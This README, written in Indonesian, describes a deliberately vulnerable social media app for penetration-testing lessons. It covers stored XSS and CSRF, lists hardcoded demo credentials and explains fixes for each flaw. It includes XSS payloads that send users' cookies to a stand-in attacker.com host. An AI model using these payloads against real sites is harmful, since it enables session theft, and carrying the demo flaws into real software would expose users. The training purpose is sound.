# 🔓 Simple Social Media - Vulnerable Web Application

**⚠️ PERHATIAN: Aplikasi ini SENGAJA dibuat vulnerable untuk tujuan pembelajaran Penetration Testing!**

## Deskripsi

Aplikasi social media sederhana yang mengandung vulnerabilities berikut:
- **Stored XSS** (Cross-Site Scripting)
- **CSRF** (Cross-Site Request Forgery)

## Teknologi

- **Backend**: Node.js + Express
- **Frontend**: React + Vite
- **Database**: In-memory (simulasi)

## Instalasi

### 1. Backend Setup

```bash
cd backend
npm install
npm start
```

Server akan berjalan di `http://localhost:3000`

### 2. Frontend Setup

```bash
cd frontend
npm install
npm run dev
```

Frontend akan berjalan di `http://localhost:5173`

## User Accounts (Hardcoded)

| Username | Password | Email |
|----------|----------|-------|
| admin | admin123 | admin@vulnerable.com |
| korban | 123456 | korban@target.com |

## 🎯 Vulnerability Testing

### 1. Stored XSS Attack

**Cara Test:**
1. Login sebagai user manapun (admin atau korban)
2. Buat post dengan payload XSS:
   ```html
   <script>alert('XSS Attack!')</script>
   ```
3. Post akan tersimpan di database dan dieksekusi setiap kali halaman dimuat
4. Script akan berjalan di browser semua user yang melihat post tersebut

**Payload XSS untuk Cookie Stealing:**
```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

**Payload XSS Advanced:**
```html
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```

**Mengapa Vulnerable?**
- Backend tidak melakukan sanitasi input
- Frontend menggunakan `dangerouslySetInnerHTML` untuk render post
- Cookie tidak menggunakan `HttpOnly` flag

### 2. CSRF Attack

**Cara Test:**
1. Login sebagai "korban" di aplikasi (localhost:5173)
2. Buka file `attacker-csrf.html` di browser
3. Halaman attacker akan otomatis mengirim request untuk mengubah email
4. Kembali ke aplikasi dan refresh - email sudah berubah!

**Mengapa Vulnerable?**
- Tidak ada CSRF token validation
- Endpoint `/change-email` menerima request dari origin manapun
- CORS dikonfigurasi dengan `credentials: true` tanpa validasi proper

## 🛡️ Cara Memperbaiki Vulnerabilities

### Fix XSS:

**Backend:**
```javascript
const sanitizeHtml = require('sanitize-html');

app.post('/post', (req, res) => {
    const { content } = req.body;
    const cleanContent = sanitizeHtml(content);
    // Save cleanContent instead of raw content
});
```

**Frontend:**
```jsx
// Gunakan text content, bukan innerHTML
<div>{post.content}</div>
// JANGAN gunakan dangerouslySetInnerHTML
```

### Fix CSRF:

**Backend:**
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.post('/change-email', csrfProtection, (req, res) => {
    // Validate CSRF token
});
```

**Frontend:**
```javascript
// Include CSRF token in request
const csrfToken = document.querySelector('[name=csrf-token]').content;
fetch('/change-email', {
    headers: { 'CSRF-Token': csrfToken }
});
```

**Cookie Security:**
```javascript
res.cookie('user', username, {
    httpOnly: true,      // Prevent XSS access
    secure: true,        // HTTPS only
    sameSite: 'strict'   // Prevent CSRF
});
```

## 📚 Learning Objectives

Aplikasi ini dibuat untuk memahami:
1. Bagaimana XSS attack bekerja dan dampaknya
2. Bagaimana CSRF attack dapat mengeksploitasi kepercayaan browser
3. Pentingnya input validation dan output encoding
4. Cara mengimplementasikan security best practices

## ⚠️ Disclaimer

Aplikasi ini dibuat untuk tujuan pembelajaran cybersecurity. Jangan gunakan untuk:
- Production environment
- Menyimpan data sensitif
- Attack terhadap sistem tanpa izin

## 📝 License

Educational purposes only - MIT License
